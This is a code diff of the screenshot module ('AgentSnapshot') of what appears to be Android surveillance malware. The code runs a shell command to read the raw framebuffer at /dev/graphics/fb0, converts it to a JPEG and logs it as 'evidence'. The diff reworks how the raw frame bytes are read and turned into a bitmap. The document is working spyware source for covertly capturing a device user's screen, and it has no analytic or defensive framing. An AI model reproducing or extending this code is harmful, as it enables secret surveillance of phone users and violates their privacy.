@@ -135,25 +135,31 @@ public class AgentSnapshot extends AgentBase {
 				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (go): w=" + width + " h=" + height);
 
-				IntBuffer rawInt = getRawBitmap();
-				if (rawInt != null) {
+				byte[] raw = getRawBitmap();
+				//int[] pixels = new int[ width * height];
+				
+			
+				
+				if (raw != null) {
 
 					Bitmap bitmapEmpty = Bitmap.createBitmap(width, height,
 							Bitmap.Config.ARGB_8888);
 					
-					int[] pixels = new int[ width * height];
-					rawInt.rewind();
-					rawInt.get(pixels);
+					//int[] pixels = new int[ width * height];
+					//rawInt.rewind();
+					//rawInt.get(pixels);
 
-					Check.asserts(pixels.length == width * height,
-							"wrong pixel len");
+					//Check.asserts(pixels.length == width * height,
+					//		"wrong pixel len");
 
-					bitmapEmpty
-							.setPixels(pixels, 0, width, 0, 0, width, height);
+					//bitmapEmpty
+					//		.setPixels(pixels, 0, width, 0, 0, width, height);
 
 					// Bitmap bitmap=BitmapFactory.decodeByteArray(raw, 0,
 					// raw.length);
 
+					ByteBuffer buffer = ByteBuffer.wrap(raw);
+					bitmapEmpty.copyPixelsFromBuffer(buffer);
 					byte[] jpeg = toJpeg(bitmapEmpty);
 
 					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
@@ -205,7 +211,7 @@ public class AgentSnapshot extends AgentBase {
 
 	}
 
-	private IntBuffer getRawBitmap() {
+	private byte[] getRawBitmap() {
 		// String
 		// getrawpath="statuslog -c \"/system/bin/cat /dev/graphics/fb0\""
 		File filesPath = Status.getAppContext().getFilesDir();
@@ -219,16 +225,16 @@ public class AgentSnapshot extends AgentBase {
 			Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			FileChannel fc = new FileInputStream(new File(path, "frame"))
-					.getChannel();
-			IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0, fc.size())
-					.asIntBuffer();
+			//FileChannel fc = new FileInputStream(new File(path, "frame"))
+			//		.getChannel();
+			//IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0, fc.size())
+			//		.asIntBuffer();
 
-			return ib;
-			// AutoFile file = new AutoFile(path, "frame");
-			// if (file.exists()) {
-			// return file.read();
-			// }
+			//return ib;
+			 AutoFile file = new AutoFile(path, "frame");
+			 if (file.exists()) {
+			 return file.read();
+			 }
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
